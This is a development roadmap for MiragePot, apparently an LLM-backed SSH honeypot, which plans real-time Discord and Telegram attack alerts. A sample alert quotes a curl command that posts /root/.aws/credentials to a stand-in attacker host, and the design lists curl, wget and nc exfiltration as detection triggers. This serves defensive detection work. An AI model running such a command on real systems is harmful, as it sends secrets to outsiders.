# MiragePot Future Updates & Roadmap

This document tracks planned features, enhancements, and architectural improvements for MiragePot.

---

## High Priority: Real-time Attack Notifications

**Status**: Planned  
**Priority**: High  
**Estimated Effort**: 2-3 days  
**Proposed By**: User request (2026-03-30)

### Overview
Add real-time notification system to alert security teams when live attacks occur. Integrates with Discord and Telegram to deliver immediate alerts for high-risk attacks with complete forensic data.

### Business Value
- **Immediate incident response**: Security teams notified within seconds of attack detection
- **Reduced MTTD**: Mean Time To Detect drops from hours/days to real-time
- **Complete forensics**: Full session JSON logs attached for immediate analysis
- **Team collaboration**: Discord/Telegram channels enable coordinated response
- **Reduced noise**: Risk-based filtering ensures only critical threats trigger alerts

### Technical Design

#### Architecture
```
Attack Event → Event Detection → Notification Manager → Platform Adapters → Discord/Telegram
     ↓              ↓                    ↓                      ↓
 server.py     TTP Detector      Risk Filter          Webhook/Bot API
 cmd_handler   Honeytokens       Rate Limiter         JSON Attachment
```

#### Components

**1. Core Module**: `miragepot/notifications.py`
- `NotificationManager`: Orchestrates notification delivery, filtering, rate limiting
- `DiscordNotifier`: Discord webhook integration with rich embeds
- `TelegramNotifier`: Telegram Bot API with document uploads
- `NotificationQueue`: Async queue for non-blocking delivery
- `RateLimiter`: Token bucket algorithm to prevent spam

**2. Configuration**: `config.py`
```python
@dataclass
class NotificationConfig:
    enabled: bool
    discord_webhook_url: str
    telegram_bot_token: str
    telegram_chat_id: str
    min_risk_level: str  # "low", "medium", "high", "critical"
    notify_on_session_end: bool
    notify_on_realtime_events: bool
    notify_on_honeytoken_access: bool
    notify_on_honeytoken_exfiltration: bool
    include_json_attachment: bool
    include_summary: bool
    max_notifications_per_minute: int
```

**3. Environment Variables**
```bash
MIRAGEPOT_NOTIFICATIONS_ENABLED=false
MIRAGEPOT_DISCORD_WEBHOOK_URL=
MIRAGEPOT_TELEGRAM_BOT_TOKEN=
MIRAGEPOT_TELEGRAM_CHAT_ID=
MIRAGEPOT_NOTIFY_MIN_RISK=high
MIRAGEPOT_NOTIFY_SESSION_END=true
MIRAGEPOT_NOTIFY_REALTIME=true
MIRAGEPOT_NOTIFY_HONEYTOKENS_ACCESS=true
MIRAGEPOT_NOTIFY_HONEYTOKENS_EXFIL=true
MIRAGEPOT_NOTIFY_INCLUDE_JSON=true
MIRAGEPOT_NOTIFY_INCLUDE_SUMMARY=true
MIRAGEPOT_NOTIFY_RATE_LIMIT=10
```

#### Integration Points

**Real-time Alerts** (Immediate):
1. **High-threat commands** (`server.py:913-920`)
   - Trigger: Commands with threat_score >= 80
   - Contains: Command, threat score, attacker IP, session ID

2. **Honeytoken access** (`command_handler.py:2823`)
   - Trigger: AWS keys, SSH keys, credentials viewed
   - Contains: Token type, file accessed, command

3. **Exfiltration attempts** (`command_handler.py:2830`)
   - Trigger: curl POST, wget, nc with honeytoken data
   - Contains: Destination, tokens exfiltrated, command

**Session-end Summaries** (Complete Analysis):
- **Location**: `server.py:1013-1032`
- **Trigger**: High/Critical risk sessions on disconnect
- **Contains**:
  - Full TTP analysis (MITRE ATT&CK techniques)
  - Attack stage progression
  - All honeytokens accessed/exfiltrated
  - Complete command history
  - Session duration and metrics
  - Risk level and key indicators
  - Attached: `session_xxx.json` file

#### Notification Format

**Discord Embed (Session End)**:
```
🚨 HIGH RISK ATTACK SESSION ENDED

IP Address: 45.141.84.197
Session ID: a3f9c2e1b4d8
Duration: 95 seconds
Risk Level: ⚠️ HIGH

Attack Profile:
├─ Stage: Credential Access
├─ Techniques: 4 MITRE ATT&CK patterns
│  ├─ T1003.008: /etc/shadow Access
│  ├─ T1552.001: Credentials in Files
│  └─ T1552.004: Private Keys
└─ Commands: 12 total (3 high-threat)

Honeytoken Activity:
├─ 🔑 AWS Access Key: VIEWED
├─ 🔑 AWS Secret Key: VIEWED
└─ 📤 Exfiltration attempts: 1
    └─ curl POST to 45.141.84.197:8080

Session Log: [Download JSON]
```

**Telegram Message (Real-time)**:
```
⚡ IMMEDIATE THREAT DETECTED

🎯 Honeytoken Exfiltration Attempt

Attacker: 103.75.190.88
Session: f4a2c9d3e8b1
Time: 2026-03-30 14:32:18 UTC

Command:
curl -X POST http://attacker.com -d @/root/.aws/credentials

Tokens Involved:
• AWS Access Key (aws_access_xxx)
• AWS Secret Key (aws_secret_xxx)

Destination: attacker.com

[View Full Session]
```

#### Implementation Checklist

**Phase 1: Core Module**
- [ ] Create `miragepot/notifications.py`
- [ ] Implement `NotificationManager` class
- [ ] Implement `DiscordNotifier` with webhook API
- [ ] Implement `TelegramNotifier` with Bot API
- [ ] Add async notification queue
- [ ] Add rate limiting (token bucket)
- [ ] Add retry logic with exponential backoff
- [ ] Add error handling and logging

**Phase 2: Configuration**
- [ ] Add `NotificationConfig` to `config.py`
- [ ] Update `Config` class to include notifications
- [ ] Add environment variable parsing
- [ ] Add validation for webhook URLs/tokens
- [ ] Create `get_notification_config()` helper

**Phase 3: Integration**
- [ ] Update `server.py` - session-end hook (line ~1032)
- [ ] Update `server.py` - high-threat command hook (line ~920)
- [ ] Update `command_handler.py` - honeytoken access hook (line ~2823)
- [ ] Update `command_handler.py` - exfiltration hook (line ~2830)
- [ ] Pass notifier to all relevant functions
- [ ] Ensure async/await compatibility

**Phase 4: Dependencies**
- [ ] Add `aiohttp>=3.9.0` to requirements.txt
- [ ] Add `python-telegram-bot>=20.0` to requirements.txt
- [ ] Update pyproject.toml optional dependencies
- [ ] Test dependency installation

**Phase 5: Environment**
- [ ] Update `.env.example` with notification variables
- [ ] Update `.env.docker.example` with notification variables
- [ ] Add comments and examples
- [ ] Document Discord webhook creation
- [ ] Document Telegram bot creation

**Phase 6: Testing**
- [ ] Create `tests/test_notifications.py`
- [ ] Test Discord webhook mocking
- [ ] Test Telegram bot mocking
- [ ] Test rate limiting
- [ ] Test risk filtering
- [ ] Test JSON attachment generation
- [ ] Test async queue behavior
- [ ] Test error handling and retries

**Phase 7: Documentation**
- [x] Create `docs/info/NOTIFICATIONS.md`
  - [ ] Discord webhook setup guide
  - [ ] Telegram bot setup guide (@BotFather)
  - [ ] Configuration examples
  - [ ] Notification format reference
  - [ ] Troubleshooting section
- [ ] Update `README.md` - add notifications feature
- [x] Update `docs/info/CONFIGURATION.md` - notification settings
- [ ] Add screenshots of notifications
- [ ] Add FAQ section

**Phase 8: Metrics & Monitoring**
- [ ] Add Prometheus metrics:
  - [ ] `notifications_sent_total{platform="discord|telegram",type="realtime|session_end"}`
  - [ ] `notifications_failed_total{platform,reason}`
  - [ ] `notification_delivery_duration_seconds`
  - [ ] `notification_queue_size`
- [ ] Expose metrics in `metrics.py`
- [ ] Add Grafana dashboard panel for notifications

**Phase 9: Docker Integration**
- [ ] Test notifications in Docker environment
- [ ] Verify environment variable passing
- [ ] Test network connectivity from container
- [ ] Update `docker-compose.yml` with example config
- [ ] Add health check for notification system

**Phase 10: Optional Enhancements**
- [ ] Add Slack webhook support
- [ ] Add Microsoft Teams webhook support
- [ ] Add email (SMTP) support
- [ ] Add notification templates (Jinja2)
- [ ] Add interactive buttons (ban IP, view dashboard)
- [ ] Add notification history in dashboard
- [ ] Add test command: `python -m miragepot.notifications --test`

#### Technical Specifications

**Discord Integration**:
- Webhook API (no bot registration required)
- Rich embeds with color coding by risk level:
  - 🔴 Red (#ff0000): Critical
  - 🟠 Orange (#ff6600): High
  - 🟡 Yellow (#ffcc00): Medium
  - 🔵 Blue (#0099ff): Low
- File attachments up to 8MB (session JSON)
- Rate limit: 5 requests per 2 seconds per webhook
- Max embed size: 6000 characters

**Telegram Integration**:
- Bot API with `sendMessage` + `sendDocument`
- Markdown/HTML formatting
- File uploads up to 50MB (session JSON)
- Inline keyboard buttons for actions
- Rate limit: 30 messages per second
- Supports groups and channels

**Async Architecture**:
- `asyncio.create_task()` for non-blocking sends
- Queue notifications to handle bursts
- Background worker processes queue with configurable workers
- Graceful shutdown flushes queue
- Failed notifications logged, honeypot continues

**Security Considerations**:
- Webhook URLs stored in environment (never commit)
- Warning in docs about webhook URL security
- Sanitize command output to prevent injection
- Escape special characters in Discord markdown
- Limit message size (truncate long commands)
- No sensitive internal system details in notifications
- Clear documentation about attacker IP logging

#### Performance Impact
- **Latency**: <50ms added to attack detection (async queue)
- **Memory**: ~5MB for notification queue (bounded)
- **CPU**: Negligible (HTTP calls offloaded to asyncio)
- **Network**: 1-5 KB per notification, <1 MB with JSON attachment

#### Testing Strategy
1. **Unit Tests**: Mock webhooks, test formatting, rate limiting
2. **Integration Tests**: Test with real Discord/Telegram test channels
3. **Load Tests**: Simulate 100 concurrent attacks, verify no dropped notifications
4. **Failure Tests**: Test network failures, invalid webhooks, API errors
5. **Manual QA**: Real attack scenarios, verify notification content accuracy

#### Rollout Plan
1. **Alpha**: Internal testing with maintainer's Discord/Telegram
2. **Beta**: Opt-in testing by early adopters
3. **GA**: Default disabled, documented setup process
4. **Post-launch**: Monitor metrics, gather feedback, iterate

---

## Medium Priority Features

### Enhanced Threat Intelligence Integration
**Status**: Concept  
**Priority**: Medium  
**Effort**: 1-2 weeks

- Integrate with threat intel feeds (AbuseIPDB, GreyNoise)
- Automatic IP reputation lookups
- Known malware signature detection
- Botnet identification
- Geographic threat heatmap

### Advanced AI Prompt Engineering
**Status**: Concept  
**Priority**: Medium  
**Effort**: 1 week

- Dynamic persona switching (vulnerable server, hardened server, etc.)
- Attacker-specific response adaptation
- More realistic error messages
- Simulated service versions with known CVEs

### Multi-Protocol Support
**Status**: Concept  
**Priority**: Low  
**Effort**: 3-4 weeks

- HTTP/HTTPS honeypot module
- FTP honeypot module
- Telnet honeypot module
- SMB honeypot module
- Unified logging and dashboard

---

## Low Priority Enhancements

### Machine Learning Attack Classification
- Train ML model on attack patterns
- Automatic attacker skill level classification
- Anomaly detection for zero-day techniques

### Distributed Honeypot Network
- Multi-node deployment
- Centralized log aggregation
- Cross-node attack correlation
- Global threat map

### Interactive Attacker Engagement
- LLM-powered conversational responses
- Fake privilege escalation exploits
- Simulated lateral movement opportunities
- Time-wasting tasks for attackers

---

## Completed Features

### ✅ Core Honeypot (v0.2.0)
- SSH server with Paramiko
- AI response generation with Ollama
- Basic logging and dashboard

### ✅ Threat Detection (v0.2.0)
- MITRE ATT&CK TTP detection (146 patterns)
- Honeytoken system (7 token types)
- Threat scoring and tarpit delays
- Prometheus metrics integration
- Grafana dashboards

---

## Feature Request Template

When proposing new features, include:

```markdown
### Feature Name
**Status**: Proposed  
**Priority**: High/Medium/Low  
**Estimated Effort**: X days/weeks  
**Proposed By**: Name (Date)

#### Problem Statement
What problem does this solve?

#### Proposed Solution
How should it work?

#### Technical Approach
Implementation details

#### Success Metrics
How do we measure success?

#### Dependencies
What else needs to be done first?
```

---

## Rejected Features

### ❌ Real Command Execution
**Reason**: Security risk - honeypot must remain isolated  
**Date**: Project inception

### ❌ Cryptocurrency Mining Detection
**Reason**: Out of scope - focus on SSH attacks  
**Date**: 2026-03-15

---

**Last Updated**: 2026-03-30  
**Maintainer**: Evin Brijesh
